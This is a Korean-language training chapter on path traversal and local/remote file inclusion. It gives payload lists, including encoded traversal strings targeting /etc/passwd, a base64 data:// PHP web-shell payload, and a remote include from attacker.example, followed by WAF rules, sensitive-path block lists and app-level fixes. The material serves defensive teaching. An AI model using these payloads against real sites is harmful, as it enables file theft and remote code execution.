# 07. Path Traversal & File Inclusion — 경로 정규화 우회

> OWASP Top 10:2025 기준 **A01 Broken Access Control**(파일 접근 권한 우회 관점)과 **A05 Injection**(LFI/RFI 페이로드 관점)의 경계에 걸쳐 있다.

## 학습 목표
- Path Traversal, LFI, RFI의 차이를 구분하고 각 공격의 목표를 설명할 수 있다
- 경로 정규화 우회 기법(`..`, 인코딩, 널바이트, 유니코드)을 보고 WAF 룰의 한계를 이해한다
- Cloudflare에서 룰로 1차 차단하고, 앱에서 경로 화이트리스트·카노니컬라이제이션으로 근본 대응하는 흐름을 설계한다

---

## 1. 개념 정리

### 1.1 Path Traversal (Directory Traversal)
웹 애플리케이션이 **사용자 입력을 파일 경로에 이어붙일** 때, `../`를 이용해 의도된 디렉터리를 벗어나 임의 파일을 읽거나 쓰는 공격.

```
요청: /download?file=../../../../etc/passwd
서버: open("/var/www/files/" + file)
실제: open("/var/www/files/../../../../etc/passwd") = /etc/passwd
```

### 1.2 LFI (Local File Inclusion)
PHP 등에서 `include`/`require`가 사용자 입력으로 경로를 받는 경우. 단순 파일 읽기를 넘어 **코드 실행**까지 가능.

```php
include($_GET['page'] . ".php");
```
→ `?page=../../../../etc/passwd%00` (널바이트 절단)
→ 로그 파일에 PHP 코드 삽입 후 `?page=/var/log/apache/access` 로 실행

### 1.3 RFI (Remote File Inclusion)
LFI의 확장형. 원격 URL의 스크립트를 include. PHP의 `allow_url_include=On` 설정 있을 때 발동.
```
?page=http://attacker.example/shell.txt
```
최근에는 기본 비활성화라 드물지만 여전히 존재.

---

## 2. 대표 페이로드

### 2.1 기본
```
../../../../etc/passwd
../../../../etc/shadow
../../../../../../../../../../etc/passwd
..\..\..\..\windows\win.ini    -- Windows
```

### 2.2 인코딩
```
%2e%2e%2f%2e%2e%2fetc%2fpasswd        -- URL
%252e%252e%252fetc%252fpasswd          -- 이중 URL
..%2f..%2f..%2fetc%2fpasswd
..%5c..%5cwindows%5cwin.ini            -- 역슬래시
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### 2.3 우회 변형
```
....//....//etc/passwd           -- `..` 필터 후 반복 제거로 발생
..././..././etc/passwd
..;/..;/etc/passwd                -- 경로 파라미터 (Tomcat 등)
/var/www/files/../../../../etc/passwd   -- 절대경로 허용 시
```

### 2.4 널바이트 절단 (레거시)
```
../../../etc/passwd%00.jpg
```
C 기반 언어에서 `%00`(NULL) 이후를 잘랐던 시절 유효. 최신 스택에서는 대부분 수정됨.

### 2.5 UTF-8 오버롱 / 유니코드
```
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd    -- UTF-8 overlong '.'
..\u2216..\u2216etc/passwd              -- 유니코드 백슬래시
```

### 2.6 파일 스킴 (LFI)
```
?page=file:///etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```
`php://filter`는 소스 코드 유출에, `data://`는 RCE에 자주 쓰인다.

---

## 3. WAF 탐지 설계

### 3.1 기본 패턴
```
(lower(url_decode(http.request.uri)) contains "../") or
(lower(url_decode(http.request.uri)) contains "..\\") or
(lower(url_decode(http.request.uri)) contains "%2e%2e")
→ Managed Challenge
```

### 3.2 이중 디코드
```
(lower(url_decode(url_decode(http.request.uri))) contains "../")
→ Block
```

### 3.3 민감 파일·경로 키워드
```
(lower(url_decode(http.request.uri)) matches
  "(etc/passwd|etc/shadow|proc/self|windows/win\.ini|boot\.ini|web\.config|\.env|\.git/)")
→ Block
```
`.env`, `.git/`, `web.config`, `.DS_Store`는 정찰 단계의 고빈도 타겟이라 **조건 없이 Block**해도 안전한 편.

### 3.4 PHP wrapper 탐지
```
(lower(url_decode(http.request.uri.query)) matches
  "(php://|file://|data:text/|expect://|zip://|phar://)")
→ Block
```

### 3.5 조합 판정
```
(http.request.uri.path matches "^/(download|read|view|file|load)") and
(lower(url_decode(http.request.uri.query)) matches
  "(\.\./|\.\.\\|%2e%2e)")
→ Block
```
파일 조회 성격의 엔드포인트에 국한하면 오탐이 거의 없다.

---

## 4. 애플리케이션 레이어 대응

### 4.1 경로 화이트리스트
```python
ALLOWED = {"report_a.pdf", "report_b.pdf"}
if filename not in ALLOWED:
    abort(403)
```
가능하면 파일명을 **ID로 매핑**(DB 조회)하는 방식이 가장 안전.

### 4.2 카노니컬라이제이션 후 베이스 경로 검증
```python
base = "/var/www/files"
full = os.path.realpath(os.path.join(base, filename))
if not full.startswith(base + os.sep):
    abort(403)
```
`realpath`가 심볼릭 링크까지 해석하므로 traversal은 물론 심볼릭 링크 공격도 막는다.

### 4.3 위험 함수 사용 금지
- PHP: `include`/`require`에 사용자 입력 금지. 라우팅은 switch/case로.
- Python: `open()`의 경로 인자에 raw 입력 금지.
- Node: `fs.readFile`에 `path.normalize` + `startsWith(base)` 검증.

### 4.4 파일 응답 시
- `Content-Disposition: attachment; filename="..."` (XSS 방지)
- MIME 타입 고정 또는 검증된 값만
- 심볼릭 링크 비활성화

---

## 5. 실제 로그 예시

```json
{
  "ClientIP": "198.51.100.120",
  "ClientRequestMethod": "GET",
  "ClientRequestURI": "/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
  "ClientRequestUserAgent": "Mozilla/5.0 ...",
  "EdgeResponseStatus": 403,
  "SecurityAction": "block",
  "WAFAttackScore": 12,
  "BotScore": 20
}
```
URL 디코드: `file=../../../../etc/passwd` — 전형적 traversal.

민감 파일 탐색 정찰 로그 예:
```
/.git/config
/.env
/.DS_Store
/web.config
/WEB-INF/web.xml
/phpinfo.php
/server-status
```
이런 경로는 프로덕션에선 **존재 자체가 곧 정찰 대상**이다. WAF에서 무조건 차단하는 것이 일반적.

---

## 6. 운영 체크리스트

### 6.1 WAF
- [ ] `../` / `..\\` / `%2e%2e` 이중 디코드 매칭
- [ ] 민감 파일 경로(`.env`, `.git/`, `etc/passwd` 등) 무조건 Block
- [ ] PHP wrapper (`php://`, `file://`, `data:`) 차단
- [ ] 파일 조회 엔드포인트 대상 강한 룰

### 6.2 애플리케이션
- [ ] 파일명 → ID 매핑 또는 화이트리스트
- [ ] `realpath` + 베이스 경로 prefix 검증
- [ ] `include`/`require`에 사용자 입력 전달 금지
- [ ] 정적 파일 서버는 심볼릭 링크 비활성화

### 6.3 운영
- [ ] `.git`, `.env` 파일이 웹 루트에 존재하지 않도록 배포 파이프라인에서 점검
- [ ] 디렉터리 리스팅(autoindex) 비활성화
- [ ] 4xx 급증 시 정찰 탐지 알림

---

## 7. 체크포인트

<details>
<summary>Q1. `../` 문자열만 필터링하면 왜 부족한가?</summary>

- URL 인코딩(`%2e%2e%2f`), 이중 인코딩(`%252e%252e%252f`)
- 역슬래시(`..\\`), 경로 파라미터(`..;/`)
- 단순 치환 필터를 가진 앱에서 `....//` 같은 회복 우회
- UTF-8 오버롱 인코딩

→ **여러 디코드 패스 + 여러 구분자 변형을 매칭**해야 하고, 애플리케이션 레이어에서 `realpath` 기반 검증을 반드시 함께 해야 한다.
</details>

<details>
<summary>Q2. `.env` 파일 접근 시도는 어떻게 탐지·대응하는가?</summary>

- WAF에서 `/.env`, `/\.git/`, `/web\.config` 등 민감 파일 경로를 **Block List**로 항상 차단
- 정적 서버 설정에서 `.`으로 시작하는 파일 서빙 금지
- 빌드/배포 파이프라인에서 `.env` 파일이 artifact에 포함되지 않도록 체크
- Logpush에 해당 경로 접근 이벤트를 별도 태깅해 정찰 패턴 추적
</details>

<details>
<summary>Q3. LFI와 Path Traversal은 왜 같이 다루는가, 그리고 무엇이 다른가?</summary>

둘 다 **사용자 입력이 파일 경로로 사용되는 결함**이라는 점에서 같다. 차이는:
- **Path Traversal**: 주로 `open`/`read`/정적 파일 서버가 대상. **정보 유출**이 주 피해.
- **LFI**: `include`/`require`가 대상. 유출을 넘어 **코드 실행(RCE)**까지 이어질 수 있음. PHP 로그 poisoning, `php://filter`, `data://` 스킴 등과 결합되어 심각도가 높아진다.
</details>

---

## 8. 더 읽을거리

- OWASP — Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- OWASP — Testing for Local File Inclusion: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
- OWASP Cheat Sheet — File Upload: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- PortSwigger — Path Traversal: https://portswigger.net/web-security/file-path-traversal
- PortSwigger — File inclusion: https://portswigger.net/kb/issues/00100f00_local-file-inclusion
- Cloudflare — Custom rules: https://developers.cloudflare.com/waf/custom-rules/

---

**다음 챕터 후보**: `08_auth_session.md` (인증·세션 취약점, 크리덴셜 스터핑, Turnstile), `09_known_cve_signatures.md` (Log4Shell, Spring4Shell 등 공개 CVE의 WAF 시그니처 설계)
